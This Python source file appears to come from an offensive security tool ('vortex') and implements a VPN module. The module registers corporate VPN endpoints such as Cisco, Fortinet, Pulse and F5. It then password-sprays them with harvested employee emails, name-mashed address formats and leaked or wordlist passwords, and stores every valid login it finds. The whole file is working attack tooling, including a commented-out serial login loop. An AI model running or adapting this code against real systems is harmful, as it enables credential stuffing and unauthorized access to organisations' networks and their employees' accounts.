import os.path
import re

from colorama import Fore
from actions.action import Action
from db.dao.domain import DomainDao
from db.dao.endpoint import EndpointDao
from db.dao.login import LoginDao
from db.dao.user import UserDao
from db.enums.types import EndpointType
from db.models.endpoint import Endpoint
from enumerators.factories import VpnEnumeratorFactory
from utils.namemash import NameMasher
from utils.utils import colors, success, info, progress, error, wait_for_input_like, is_subdomain, fatal, validate_target_port, \
    highlight, create_additional_info


class Vpn(Action):
    def __init__(self, workspace):
        super().__init__(workspace)
        self.endpoint_types = ["cisco", "citrix", "citrixlegacy", "fortinet", "pulse", "sonicwall", "f5", "openvpn"]
        self.commands = ["add", "attack"]

    def execute(self, **kwargs):
        self.dbh.connect()
        u_dao = UserDao(handler=self.dbh)
        e_dao = EndpointDao(handler=self.dbh)
        s_dao = LoginDao(handler=self.dbh)

        command = kwargs["command"]
        if not command or command not in self.commands:
            command = self.choose_command()

        use_leaks = kwargs["leaks"]
        passwords_file = kwargs["passwords_file"]
        if not passwords_file and not use_leaks and command == "attack":
            error("A password file should be given or define 'use leaks' (-L, or --leaks) instead")
            exit(1)

        endpoint_type = kwargs["endpoint_type"]

        if (not endpoint_type or endpoint_type not in self.endpoint_types) and command != "add":
            info("Choose an endpoint type to attack, or all to attack any supported endpoint")
            endpoint_type = self.choose(self.endpoint_types + ["all"])

        if endpoint_type == "all":
            endpoint_type = None

        # Get all registered users
        users = u_dao.list_all()
        # Get all found logins
        db_logins = [f"{s.email}:{s.password}:{s.url}" for s in s_dao.list_all()]

        if kwargs.get("no-primary-email"):
            info("No-Primary-Email selected. Choose an alternative email format")
            masher = NameMasher()
            masher.select_format()
            temp = []
            for u in users:
                tokens = u.name.split(" ")
                if len(tokens) == 1:
                    continue
                elif len(tokens) == 2:
                    u.mail = masher.mash(tokens[0], tokens[1]) + "@" + u.email.split("@")[-1]
                else:
                    u.mail = masher.mash(tokens[0], tokens[-1], second_name=tokens[1]) + "@" + u.email.split("@")[-1]

        passwords = None
        if passwords_file and os.path.isfile(passwords_file):
            passwords = [p.strip() for p in open(passwords_file).readlines()]

        target = kwargs["url"]
        if target is None:
            error("Domain field is required!")
            info("If you're adding a domain, then insert the correct VPN target (IP:PORT)")
            info("Otherwise, you can enter any filter to restrict the attack")
            info("Example: -D example -> Will attack all endpoints like %example%")
            info("Example: -D vpn.example.com:443 -> Will attack only vpn.example.com")
            while not target:
                info("- VPN Target (IP:PORT): ")
                target = wait_for_input_like(r".*")
        target = target.strip()

        if is_subdomain(target) and validate_target_port(target):
            endpoints = [e_dao.find_by_name(target)]
        elif target == "*":
            # Get all registered endpoints
            endpoints = e_dao.list_all()
        else:
            endpoints = e_dao.find_by_name_like(target)

        if len(endpoints) == 0:
            fatal(
                f"{target} not found in the DB. Please run the following commands first:\n"
                f"\t- 1. Add subdomain: `{highlight(f'python vortex -w {self.dbh.workspace} subdomain -c add {target}')}`\n"
                f"\t- 2. Portscan:      `{highlight(f'python vortex -w {self.dbh.workspace} portscan -c single {target}')}`\n"
            )

        if command == "attack":
            for endpoint in endpoints:
                if endpoint_type and EndpointType.get_name(endpoint.endpoint_type) != endpoint_type:
                    continue
                info(f"Attacking {endpoint.target}")
                additional_info = create_additional_info(
                    endpoint=endpoint
                )

                vpn_name = EndpointType.get_name(int(endpoint.endpoint_type))

                enumerator = VpnEnumeratorFactory.from_name(vpn_name, endpoint.target)
                if not enumerator:
                    error("Not a VPN endpoint, skipping.")
                    continue
                enumerator.setup(**additional_info)
                enumerator.parallel_login(users=users, passwords=passwords, use_leaks=use_leaks)
                progress(f"Found {len(enumerator.found)} valid logins", indent=2)
                info("Updating Db...")
                for login in enumerator.found:
                    if f'{login["username"]}:{login["password"]}:{endpoint.target}' not in db_logins:
                        s_dao.save_new(login["username"], login["password"], endpoint.target)
                success("Done")
                """
                attempts = []
                if use_leaks:
                    for u in users:
                        for leak in u.leaks:
                            if f"{u.email}:{leak}" in attempts:
                                continue
                            else:
                                attempts.append(f"{u.email}:{leak}")
                            if enumerator.login(u.email, leak):
                                print(colors("[+] ", Fore.CYAN) + f"{u.email}:{leak} is valid!")
                            else:
                                print(colors("[-] ", Fore.RED) + f"{u.email}:{leak} is not valid.")
                else:
                    if passwords_file and os.path.isfile(passwords_file):
                        passwords = [p.strip() for p in open(passwords_file).readlines()]
                        for p in passwords:
                            for u in users:
                                if enumerator.login(u.email, p):
                                    print(colors("[+] ", Fore.CYAN) + f"{u.email}:{p} is valid!")
                                    s_dao.save_new(u, p, endpoint.target)
                                else:
                                    print(colors("[-] ", Fore.RED) + f"{u.email}:{p} is not valid.")
                """
        elif command == "add":
            if not is_subdomain(target):
                fatal("Domain should be a subdomain")

            vpn = kwargs["endpoint_type"]
            endpoint_type = None
            if vpn is None:
                for vt in EndpointType.value_list():
                    vpn_name = EndpointType.get_name(vt)
                    enumerator = VpnEnumeratorFactory.from_name(vpn_name, target, group="dummy")
                    if enumerator is None:
                        continue
                    result, res = enumerator.safe_validate()
                    if result:
                        success(f"{target} is a {vpn_name} target!")
                        endpoint_type = vt
                        break
                    else:
                        error(f"{target} is not a {vpn_name} target.")

            else:
                endpoint_type = EndpointType.from_name(vpn)
            if endpoint_type is None and vpn is not None:
                print(f"[-] {vpn} is not a valid VPN type")
                exit(1)
            elif endpoint_type is None:
                print(f"[-] Cannot add target: unknown VPN type")
                exit(1)
            in_db = False
            for e in endpoints:
                if f"{e.target}:{e.endpoint_type}" == f"{target}:{endpoint_type}":
                    in_db = True
            if not in_db:
                endpoint = Endpoint(target=target, endpoint_type=endpoint_type, eid=0)
                e_dao.save(endpoint)
